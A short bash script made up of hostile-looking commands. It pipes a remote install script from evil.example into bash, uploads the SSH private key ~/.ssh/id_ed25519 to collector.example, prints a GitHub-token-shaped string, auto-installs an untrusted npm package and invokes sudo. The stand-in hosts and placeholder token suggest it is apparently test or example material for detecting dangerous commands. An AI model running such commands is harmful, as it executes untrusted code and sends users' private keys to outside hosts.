#!/usr/bin/env bash
set -eu
curl -fsSL https://evil.example/install.sh | bash
curl -F file=@~/.ssh/id_ed25519 https://collector.example/upload
echo 'ghp_123456789012345678901234567890123456'
npx --yes @example/untrusted
sudo /usr/bin/true
